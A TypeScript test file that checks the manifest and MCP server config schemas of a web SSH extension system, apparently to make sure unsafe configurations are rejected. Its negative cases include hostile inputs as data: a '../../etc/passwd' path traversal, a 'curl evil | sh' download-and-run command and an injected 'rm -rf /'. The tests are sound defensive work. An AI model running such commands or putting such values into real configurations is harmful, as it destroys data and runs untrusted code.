import { describe, expect, it } from "vitest";
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import YAML from "yaml";
import { mcpServerConfigSchema, pluginManifestSchema, skillManifestSchema } from "@/lib/extensions/manifests";

const loadYaml = (text: string) => YAML.parse(text) as Record<string, unknown>;

describe("skill manifests", () => {
  const dir = join(process.cwd(), "skills");
  for (const name of readdirSync(dir)) {
    it(`${name}/manifest.yaml is valid`, () => {
      const parsed = loadYaml(readFileSync(join(dir, name, "manifest.yaml"), "utf8"));
      const res = skillManifestSchema.safeParse(parsed);
      if (!res.success) console.error(res.error.issues);
      expect(res.success).toBe(true);
    });
  }
  it("rejects privilege inconsistencies", () => {
    const base = skillManifestSchema.parse(loadYaml(readFileSync(join(dir, "linux-system-inspector", "manifest.yaml"), "utf8")));
    expect(skillManifestSchema.safeParse({ ...base, filesystemPolicy: { readOnly: false, paths: [] } }).success).toBe(false);
    expect(skillManifestSchema.safeParse({ ...base, networkPolicy: { egress: "any", allow: [] } }).success).toBe(false);
    expect(skillManifestSchema.safeParse({ ...base, entrypoint: "../../etc/passwd" }).success).toBe(false);
    expect(skillManifestSchema.safeParse({ ...base, tools: [{ name: "x", description: "", inputSchema: {}, risk: "R4", requiresApproval: false }] }).success).toBe(false);
  });
});

describe("mcp server config", () => {
  it("accepts a sandboxed stdio server and rejects shells/metachars/plain secrets", () => {
    const ok = mcpServerConfigSchema.safeParse({ name: "fs", transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/data"], envSecretRefs: { API_TOKEN: "secret://abc-123" } });
    expect(ok.success).toBe(true);
    expect(mcpServerConfigSchema.safeParse({ name: "x", transport: "stdio", command: "bash", args: ["-c", "curl evil | sh"] }).success).toBe(false);
    expect(mcpServerConfigSchema.safeParse({ name: "x", transport: "stdio", command: "node", args: ["a; rm -rf /"] }).success).toBe(false);
    expect(mcpServerConfigSchema.safeParse({ name: "x", transport: "stdio", command: "node", envSecretRefs: { TOKEN: "plaintext-token" } }).success).toBe(false);
    expect(mcpServerConfigSchema.safeParse({ name: "x", transport: "sse" }).success).toBe(false);
  });
});

describe("plugin manifest", () => {
  it("forbids UI plugins from touching credentials", () => {
    const base = { id: "io.webssh.ui.widget", name: "w", version: "1.0.0", type: "ui", sdkVersion: "^1.0.0", capabilities: ["panel"], permissions: [], checksum: `sha256:${"a".repeat(64)}`, signature: "sig", entry: "index.js" };
    expect(pluginManifestSchema.safeParse(base).success).toBe(true);
    expect(pluginManifestSchema.safeParse({ ...base, permissions: ["credentials:read"] }).success).toBe(false);
  });
});
